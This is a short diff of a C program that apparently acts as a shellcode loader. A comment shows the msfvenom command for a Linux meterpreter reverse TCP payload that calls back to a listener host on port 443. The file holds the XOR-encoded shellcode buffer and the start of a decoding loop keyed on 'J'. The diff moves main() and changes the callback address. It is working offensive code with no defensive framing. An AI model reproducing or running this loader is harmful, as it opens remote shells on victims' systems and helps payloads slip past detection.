@@ -2,7 +2,9 @@
 #include <stdlib.h>
 #include <unistd.h>
 
-//msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.49.136 LPORT=443 PREPENDFORK=true -f c -t 300 -o c_shellcode.txt
+int main (int argc, char **argv)
+{
+  //msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=443 PREPENDFORK=true -f c -o c_shellcode.txt
 unsigned char buf[] = 
 "\xeb\x27\x5b\x53\x5f\xb0\x0c\xfc\xae\x75\xfd\x57\x59\x53\x5e"
 "\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\xd0\xdd"
@@ -16,10 +18,7 @@ unsigned char buf[] =
 "\x25\x5e\x6c\x06\x6c\x03\x4e\x8f\xe1\x4e\x37\xf0\x09\x03\x5f"
 "\x5f\x59\x4e\x83\xc6\x7f\xc1\x6c\x3a\x5e\x6c\x07\x59\x09\x03"
 "\x58\x6c\x78\x5c\x09\x03\x4e\x83\xc6\x7e\xeb\xf9\xe0\xd0\xdd";
-
-
-int main (int argc, char **argv)
-{
+  
   char xor_key = 'J';
   int payload_length = (int) sizeof(buf);
   for (int i=0; i<payload_length; i++)
